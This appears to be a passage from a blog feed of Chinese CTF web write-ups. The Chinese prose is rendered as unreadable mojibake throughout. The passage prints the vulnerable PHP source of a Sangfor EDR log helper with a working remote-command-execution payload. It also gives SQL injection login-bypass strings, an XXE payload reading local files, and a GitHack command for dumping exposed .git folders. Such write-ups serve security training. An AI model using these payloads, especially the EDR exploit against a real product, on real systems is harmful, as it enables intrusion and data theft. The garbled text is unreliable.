id="è€ƒå¯ŸlinuxæŒ‡ä»¤"><a href="#è€ƒå¯ŸlinuxæŒ‡ä»¤" class="headerlink" title="è€ƒå¯ŸlinuxæŒ‡ä»¤"></a>è€ƒå¯ŸlinuxæŒ‡ä»¤</h3><h4 id="é¢˜ç›®åœ°å€ï¼šhttp-web-game-0xctf-com-30054"><a href="#é¢˜ç›®åœ°å€ï¼šhttp-web-game-0xctf-com-30054" class="headerlink" title="é¢˜ç›®åœ°å€ï¼šhttp://web.game.0xctf.com:30054/"></a>é¢˜ç›®åœ°å€ï¼š<a href="http://web.game.0xctf.com:30054/">http://web.game.0xctf.com:30054/</a></h4><p>è¿›å»çœ‹åˆ°<code>è¯·è¾“å…¥linuxæŒ‡ä»¤</code></p><h3 id="æœ€ç»ˆ-4"><a href="#æœ€ç»ˆ-4" class="headerlink" title="æœ€ç»ˆ"></a>æœ€ç»ˆ</h3><p>ç›´æ¥cat /flag</p><p>é—®é¢˜è§£å†³ï¼š0xGame{fl4g_1s_c0ntent}</p><h2 id="edr"><a href="#edr" class="headerlink" title="edr"></a>edr</h2><h3 id="è€ƒå¯Ÿedrå’Œæœç´¢å¼•æ“"><a href="#è€ƒå¯Ÿedrå’Œæœç´¢å¼•æ“" class="headerlink" title="è€ƒå¯Ÿedrå’Œæœç´¢å¼•æ“"></a>è€ƒå¯Ÿedrå’Œæœç´¢å¼•æ“</h3><h4 id="é¢˜ç›®åœ°å€ï¼šhttp-web1-game-0xctf-com-40000"><a href="#é¢˜ç›®åœ°å€ï¼šhttp-web1-game-0xctf-com-40000" class="headerlink" title="é¢˜ç›®åœ°å€ï¼šhttp://web1.game.0xctf.com:40000/"></a>é¢˜ç›®åœ°å€ï¼š<a href="http://web1.game.0xctf.com:40000/">http://web1.game.0xctf.com:40000/</a></h4><p>æ·±ä¿¡æœedrçš„æ¼æ´</p><p>è¿™é‡Œæœ‰ä¸€ç¯‡ä»‹ç»ï¼š<a class="url" href="https://www.weixiuzhan.cn/news/show-21463.html" target="_blank" rel="noopener noreferrer">https://www.weixiuzhan.cn/news/show-21463.html</a></p><p>æºç åœ¨è¿™</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * c.php * æŸ¥çœ‹ldbçš„æ—¥å¿— * æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤ï¼Œå¯ä»¥è¿‡æ»¤æ–‡ä»¶ä»¥åŠæ¯è¡Œæ—¥å¿—   */</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**   * ç¼–è§£ç       @param string $data ç¼–è§£ç æ•°æ®        * @return string è¿”å›ç¼–è§£ç æ•°æ®          /              $code = function($data) &#123;          for ($i = 0; $i &lt; strlen($data); ++$i) &#123;              $data[$i] = $data[$i] ^ 'G';          &#125;          return $data;              &#125;;/** * åŠ å¯†è¯·æ±‚ * @param string $site  ç«™ç‚¹ * @param string $query è¯·æ±‚ä¸² * @return string è¿”å›è¯·æ±‚URL */</span><span class="token variable">$request</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$site</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$site</span></span>/<span class="token interpolation"><span class="token variable">$path</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * è§£å¯†å›å¤ * @param string $data å›å¤æ•°æ® * @return array è¿”å›å›å¤æ•°æ® */</span><span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$dec</span> <span class="token operator">=</span> <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$dec</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * æ‰¾åˆ°åŒ¹é…çš„æ—¥å¿— * @param string $path æ–‡ä»¶è·¯å¾„åŒ¹é… * @param string $item æ—¥å¿—é¡¹åŒ¹é… * @param string $topn TOP N  * @param string $host ä¸»æœº * @return array è¿”å›åŒ¹é…ç»“æœ */</span><span class="token variable">$collect</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$item</span><span class="token punctuation">,</span> <span class="token variable">$topn</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$response</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$path</span>   <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$item</span>   <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"http://127.0.0.1:8089"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"op=ll&amp;host=<span class="token interpolation"><span class="token variable">$host</span></span>&amp;path=<span class="token interpolation"><span class="token variable">$path</span></span>&amp;item=<span class="token interpolation"><span class="token variable">$item</span></span>&amp;top=<span class="token interpolation"><span class="token variable">$topn</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$response</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * æ˜¾ç¤ºæŸä¸ªè¡¨å•åŸŸ * @param array $info è¡¨å•åŸŸä¿¡æ¯, array("name" => "xx", "value" => "xxx", "note" => "help"); * @return */</span><span class="token variable">$show_input</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>&lt;font size=2><span class="token interpolation"><span class="token variable">$title</span></span>: &lt;/font>&lt;input type=\"text\" size=30 id=\"<span class="token interpolation"><span class="token variable">$name</span></span>\" name=\"<span class="token interpolation"><span class="token variable">$name</span></span>\" value=\"<span class="token interpolation"><span class="token variable">$value</span></span>\">&lt;font size=2><span class="token interpolation"><span class="token variable">$note</span></span>&lt;/font>&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * å»æ‰åæ–œæ  * @param string $var å€¼ * @return string è¿”å›å»æ‰åæ–œæ çš„å€¼ */</span><span class="token variable">$strip_slashes</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * æ˜¾ç¤ºè¡¨å• * @param array $params è¯·æ±‚å‚æ•° * @return */</span><span class="token variable">$show_form</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$strip_slashes</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$show_input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span>  <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>  <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>  <span class="token punctuation">:</span> <span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token variable">$path</span>  <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span>  <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span>  <span class="token punctuation">:</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token variable">$row</span>   <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>   <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>   <span class="token punctuation">:</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token variable">$limit</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">;</span>        <span class="token comment">// ç»˜åˆ¶è¡¨å•</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;pre>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;form id="studio" name="studio" method="post" action="">'</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Host "</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"host"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$host</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - host, e.g. 127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Path "</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"path"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$path</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - path regex, e.g. mapreduce"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Row  "</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"row"</span><span class="token punctuation">,</span>   <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$row</span><span class="token punctuation">,</span>   <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - row regex, e.g. \s[w|e]\s"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Limit"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"limit"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$limit</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - top n, e.g. 100"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;input type="submit" id="button">'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;/form>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * å…¥å£å‡½æ•° * @param array $argv é…ç½®å‚æ•° * @return */</span><span class="token variable">$main</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span>     <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$collect</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$collect</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">,</span> <span class="token variable">$limit</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"success"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"success"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$host</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$items</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$last</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$items</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$last</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$last</span> <span class="token operator">=</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"\n[<span class="token interpolation"><span class="token variable">$host</span></span>] -> <span class="token interpolation"><span class="token variable">$last</span></span>\n\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">echo</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"item"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;html>&lt;head>&lt;meta http-equiv="Content-Type" Content="text/html; Charset=utf-8">&lt;/head>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;body bgcolor="#e8ddcb">'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>&lt;b>Log Helper&lt;/b>&lt;/p>"</span><span class="token punctuation">;</span><span class="token variable">$show_form</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;pre>"</span><span class="token punctuation">;</span><span class="token variable">$main</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ä¸‹è½½</p><h3>æœ€ç»ˆ</h3>payloadï¼š./?strip_slashes=system&host=cat /flag<p>é—®é¢˜è§£å†³ï¼š0xGame{S4n9f0r_3dR_c4N_Rce_reC3n7_D4y}</p><h2 id="just-login"><a href="#just-login" class="headerlink" title="just_login"></a>just_login</h2><h3 id="burpçˆ†ç ´"><a href="#burpçˆ†ç ´" class="headerlink" title="burpçˆ†ç ´"></a>burpçˆ†ç ´</h3><h4 id="é¢˜ç›®åœ°å€ï¼šhttp-web-game-0xctf-com-30055"><a href="#é¢˜ç›®åœ°å€ï¼šhttp-web-game-0xctf-com-30055" class="headerlink" title="é¢˜ç›®åœ°å€ï¼šhttp://web.game.0xctf.com:30055/"></a>é¢˜ç›®åœ°å€ï¼š<a href="http://web.game.0xctf.com:30055/">http://web.game.0xctf.com:30055/</a></h4><p>dirsearchæ‰«ä¸åˆ°ä¸œè¥¿</p><p>sqlmapè·‘ä¸€ä¸‹æ²¡ç”¨</p><p>ä¸çŸ¥é“å¹²å•¥ï¼Œç›´æ¥burpæŠ“åŒ…ç”¨æˆ·åçˆ†ç ´<br>çœŸçˆ†å‡ºæ¥äº†</p><h3>æœ€ç»ˆ</h3>payloadï¼š<pre class="language-none"><code class="language-none">&#39; or 0&#x3D;0 #&#39; or 1&#x3D;1 or &#39;&#39;&#x3D;&#39;x&#39; or 1&#x3D;1 or &#39;x&#39;&#x3D;&#39;y</code></pre><p>é—®é¢˜è§£å†³ï¼š0xGame{e5sy_sql_1njeCtion}</p><h2 id="close-eyes"><a href="#close-eyes" class="headerlink" title="close_eyes"></a>close_eyes</h2><h3 id="æ³¨å…¥"><a href="#æ³¨å…¥" class="headerlink" title="æ³¨å…¥"></a>æ³¨å…¥</h3><h4 id="é¢˜ç›®åœ°å€ï¼šhttp-web-game-0xctf-com-30052"><a href="#é¢˜ç›®åœ°å€ï¼šhttp-web-game-0xctf-com-30052" class="headerlink" title="é¢˜ç›®åœ°å€ï¼šhttp://web.game.0xctf.com:30052/"></a>é¢˜ç›®åœ°å€ï¼š<a href="http://web.game.0xctf.com:30052/">http://web.game.0xctf.com:30052/</a></h4><h2 id="inject-me"><a href="#inject-me" class="headerlink" title="inject_me"></a>inject_me</h2><h3 id="XXEæ˜¾å¼æ”»å‡»"><a href="#XXEæ˜¾å¼æ”»å‡»" class="headerlink" title="XXEæ˜¾å¼æ”»å‡»"></a>XXEæ˜¾å¼æ”»å‡»</h3><h4 id="é¢˜ç›®åœ°å€ï¼šhttp-web-game-0xctf-com-30061"><a href="#é¢˜ç›®åœ°å€ï¼šhttp-web-game-0xctf-com-30061" class="headerlink" title="é¢˜ç›®åœ°å€ï¼šhttp://web.game.0xctf.com:30061/"></a>é¢˜ç›®åœ°å€ï¼š<a href="http://web.game.0xctf.com:30061/">http://web.game.0xctf.com:30061/</a></h4><h3 id="æœ€ç»ˆ-5"><a href="#æœ€ç»ˆ-5" class="headerlink" title="æœ€ç»ˆ"></a>æœ€ç»ˆ</h3><p>payloadï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">GVI</span> <span class="token punctuation">[</span><span class="token internal-subset"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">foo</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY xxe SYSTEM "file:///flag" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>é—®é¢˜è§£å†³ï¼š0xGame{V2ry_simple_XXE}</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éšç¼˜çš„WEB Write-up</title>
      <link href="article/suiyuan/"/>
      <url>article/suiyuan/</url>
      
        <content type="html"><![CDATA[<p>by:gyy</p><h2>WEB-å¸¸è§çš„æœé›†</h2><h3>ä¿¡æ¯æ”¶é›†</h3>é¢˜ç›®é“¾æ¥ï¼š<a class="url" href="http://10.147.19.176:7001/" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7001/</a><hr />æ•æ„Ÿæ–‡ä»¶Hello, CTFer!ä¿¡æ¯æœé›†ä¹‹æ‰€ä»¥é‡è¦ï¼Œæ˜¯å› ä¸ºå…¶å¾€å¾€ä¼šå¸¦ç»™æˆ‘ä»¬ä¸€äº›æ„æƒ³ä¸åˆ°çš„ä¸œè¥¿<p>hack fun</p><hr /><h4>yysy,ç¡®å®</h4>ä¿¡æ¯æ”¶é›†<h5>Part1</h5>é‡äº‹ä¸å†³ï¼Œå…ˆæ‰«ä¸ºæ•¬çœŸÂ·æ‰¾åˆ°äº†<pre><code>/.index.php.swp</code></pre>çŸ¥è¯†é“¾æ¥ï¼š.swpæ–‡ä»¶æ˜¯å¤‡ä»½æ–‡ä»¶ï¼Œå¹³æ—¶vimå¼ºé€€ä¸€å®šè¦æ³¨æ„.swpæ–‡ä»¶çš„åˆ é™¤ï¼<p>è¿›å»è®¿é—®ä¸‹è½½<br><? php echo 'flag3:cDBydGFudF9oYWNr}';?></p><p>å‘ç°flag3ï¼Œè¯´æ˜flagåˆ†ä¸ºå¥½å¤šéƒ¨åˆ†</p><h5>Part2</h5>æ‰«æè¿˜æ‰«åˆ°äº†<pre><code>/index.php~</code></pre>ç›´æ¥è®¿é—®å¾—flag2:c192M3J5X2lt<h5>Part3</h5>å°†æ‰«æè¿›è¡Œåˆ°åº•è¿˜æ‰«åˆ°äº†<pre><code>/robots.txt</code></pre>è¿›å»åº·åº·<pre><code>User-agent: *Disallow:/flag1_is_her3_fun.txt</code></pre>è®¿é—®å¾—flag1:aW5mb18x<h3>æœ€ç»ˆ</h3>ç»„åˆå¾—flag<h5>å°ç»“</h5>æ‰«å°±å®Œäº‹äº†<h2>WEB-ç²—å¿ƒçš„å°æ</h2><h3>Gitæ³„éœ²</h3>é¢˜ç›®é“¾æ¥ï¼š<a class="url" href="http://10.147.19.176:7002/" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7002/</a><hr />Gitæµ‹è¯•Hello, CTFer!å½“å‰å¤§é‡å¼€å‘äººå‘˜ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå°†.gitæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº†gitæ³„éœ²æ¼æ´ã€‚<p>å°æå¥½åƒä¸æ˜¯å¾ˆå°å¿ƒï¼Œç»è¿‡äº†å‡ æ¬¡è¿­ä»£æ›´æ–°å°±ç›´æ¥å°±æŠŠæ•´ä¸ªæ–‡ä»¶å¤¹æ”¾åˆ°çº¿ä¸Šç¯å¢ƒäº†:(</p><p>very easy</p><hr /><h4>Git</h4>è®¿é—®<code>./.git</code>å‘ç°è·³è½¬åˆ°äº†<code>./.git/</code>æ ¹æ®é¢˜ç›®æ˜¯gitæ³„éœ²<h5>ç¥å™¨Git Hack</h5>å‘½ä»¤ï¼š<pre><code>$ python2 GitHack.py -u "http://10.147.19.176:7002/.git"</code></pre>æ‰’ä¸‹æ¥.gitæ–‡ä»¶<h5>åˆ†æ</h5>å‘½ä»¤çœ‹ä¸€ä¸‹<pre><code>$ git log --reflogcommit 213b7e386e9b0b406d91fae58bf8be11a58c3f88 (HEAD -> master)Author: Veneno <593220746@qq.com>Date:   Wed Dec 4 11:04:14 2019 